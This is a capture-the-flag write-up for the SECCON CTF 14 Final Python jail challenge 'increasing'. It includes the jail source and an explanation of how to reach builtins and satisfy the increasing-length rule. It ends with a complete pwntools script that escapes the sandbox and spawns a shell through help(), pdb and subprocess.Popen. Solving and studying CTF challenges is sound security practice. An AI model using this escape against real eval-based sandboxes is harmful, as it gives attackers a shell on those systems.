# SECCON CTF 14 Final increasing

```python
code = input("code> ")[:130]

if not code.isascii():
    print("bye")
    exit(1)

max_len = 0
for m in __import__("re").finditer(r"\w+", code):
    if len(m[0]) <= max_len:
        print("bye")
        exit(1)
    max_len = len(m[0])

eval(code, {"__builtins__": {}})
```

Requirements:

1. No builtins: use `().__setattr__.__objclass__.__subclasses__()`
2. Increasing length: use hex literal e.g. `0x00000000123` and string literal plus slicing e.g. `"sh000000000"[:2]` (where `2` can be computed via `(([]==[])+([]==[]))`) to handle the increasing requirement

Solve by @LZDQ, here's the idea:

First, we need to access builtins, and here's the existing ways:

- `().__class__.__base__.__subclasses__()`: `__base__` is too short
- `().__class__.__mro__[1].__subclasses__()`: `__mro__` is too short
- `().__setattr__.__objclass__.__subclasses__()`: good

Next, following the idea of [1linepyjail](./seccon-2024-quals-1linepyjail.md), we can load `pdb` by running `help()`, then use `subprocess.Popen(['sh'])` (available via `<class 'subprocess.Popen'>` after loading `pdb`) to start `sh`.

Attack script:

```python
from pwn import *

context(log_level="debug")

# step 1. call help()
helper_index = 170 # found manually
p = remote(host="localhost", port=5050) # point to docker
p.recvuntil(b"code>")
p.sendline(f"().__setattr__.__objclass__.__subclasses__()[0x{helper_index:013x}]()()".encode())

# step 2. load pdb and return to jail
p.recvuntil(b"help>")
p.sendline(b"pdb")
p.sendline(b"jail")
p.recvuntil(b"code>")

# step 3. use subprocess.Popen to run sh
popen_index = 344 # found manually
p.sendline(
    (
        f"().__setattr__.__objclass__.__subclasses__()[0x{popen_index:013x}](['sh00000000000000'[:(([]==[])+([]==[]))]])"
    ).encode()
)
p.interactive()
```
